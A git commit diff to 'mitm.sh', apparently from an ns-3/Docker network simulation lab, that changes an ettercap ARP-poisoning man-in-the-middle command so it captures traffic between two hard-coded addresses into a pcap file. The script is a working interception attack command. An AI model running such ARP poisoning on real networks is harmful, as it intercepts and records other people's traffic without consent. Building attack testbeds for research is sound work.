d7ce095276feb1cf7f3ff5b3fc690528a3847715
philippschwabenbauer <philipp.schwabenbauer@gmx.de>
2022-08-22 08:58:14 +0200

    asdf

--- ns3_docker/docker/volumes/attacker/scripts/mitm.sh
+++ ns3_docker/docker/volumes/attacker/scripts/mitm.sh
@@ -5,15 +5,15 @@
 # -T use text only GUI
 #       -s [CMD] issue these commands to the GUI
 #       -q do not display packet contents
+# -w write results to file
 # -i use this network interface
 # -M <METHOD:ARGS> perfrom mitm attack  
 #       <arp:remote> This method implements the ARP poisoning mitm attack. The parameter "remote" 
 #       is optional and you have to specify it if you want to sniff remote ip address poisoning a gateway.
 # 
 
+
 TARGET1=123.100.10.1
 TARGET2=123.100.20.1
 
-while :; 
-    ettercap -T -s 's(30)q' -i eth0 -M arp:remote /$TARGET1// /$TARGET2// 
-do sleep 20; done
+ettercap -T -w mitm.pcap -i eth0 -M arp /123.100.10.1// /123.100.20.1//
